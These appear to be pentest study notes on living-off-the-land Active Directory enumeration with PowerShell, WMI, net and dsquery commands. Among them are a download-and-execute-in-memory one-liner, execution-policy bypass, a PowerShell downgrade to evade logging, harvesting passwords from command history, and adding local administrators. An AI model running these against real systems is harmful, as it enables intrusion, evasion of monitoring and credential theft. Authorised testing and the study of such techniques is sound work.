## Living Off the Land

Assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed.

### Harnessing PowerShell

|Cmd-Let|Description|
|------|-----------|
|Get-Module|Lists available modules loaded for use.|
|Get-ExecutionPolicy -List|Will print the execution policy settings for each scope on a host.|
|Set-ExecutionPolicy Bypass -Scope Process|This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|Get-Content|C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|Get-ChildItem Env: \| ft Key,Value|Return environment values such as key paths, users, computer information, etc.|
|powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer.


```powershell
## Downgrading PowerShell
powershell.exe -version 2

## Checking firewall
netsh advfirewall show allprofiles

## Checking Windows Defender
Get-MpComputerStatus

## Check if you are the only one logged in
qwinsta

## Listing various network information
arp -a
route print
```

### Windows Management Instrumentation (WMI)

**Quick WMI checks**
|Command|Description|
|-------|-----------|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|Prints the patch level and description of the Hotfixes applied|
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List|Displays basic host information to include any attributes within the list|
|wmic process list /format:list|A listing of all processes on host|
|wmic ntdomain list /format:list|Displays information about the Domain and Domain Controllers|
|wmic useraccount list /format:list|Displays information about all local accounts and any domain accounts that have logged into the device|
|wmic group list /format:list|Information about all local groups|
|wmic sysaccount list /format:list|Dumps information about any system accounts that are being used as service accounts.|

Cheatsheet - [https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4]

### Net Commands

**Table of Useful Net Commands**

|Command|Description|
|-------|-----------|
|net accounts|Information about password requirements|
|net accounts /domain|Password and lockout policy|
|net group /domain|Information about domain groups|
|net group "Domain Admins" /domain|List users with domain admin privileges|
|net group "domain computers" /domain|List of PCs connected to the domain|
|net group "Domain Controllers" /domain|List PC accounts of domains controllers|
|net group <domain_group_name> /domain|User that belongs to the group|
|net groups /domain|List of domain groups|
|net localgroup|All available groups|
|net localgroup administrators /domain|List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)|
|net localgroup Administrators|Information about a group (admins)|
|net localgroup administrators [username] /add|Add user to administrators|
|net share|Check current shares|
|net user <ACCOUNT_NAME> /domain|Get information about a user within the domain|
|net user /domain|List all users of the domain|
|net user %username%|Information about the current user|
|net use x: \computer\share|Mount the share locally|
|net view|Get a list of computers|
|net view /all /domain[:domainname]|Shares on the domains|
|net view \computer /ALL|List shares of a computer|
|net view /domain|List of PCs of the domain|

### Dsquery

Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section.

```powershell
## User search
dsquery user

## Computer search
dsquery computer

## Wildcard search
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

## Specific search
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

## Domain controller search
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```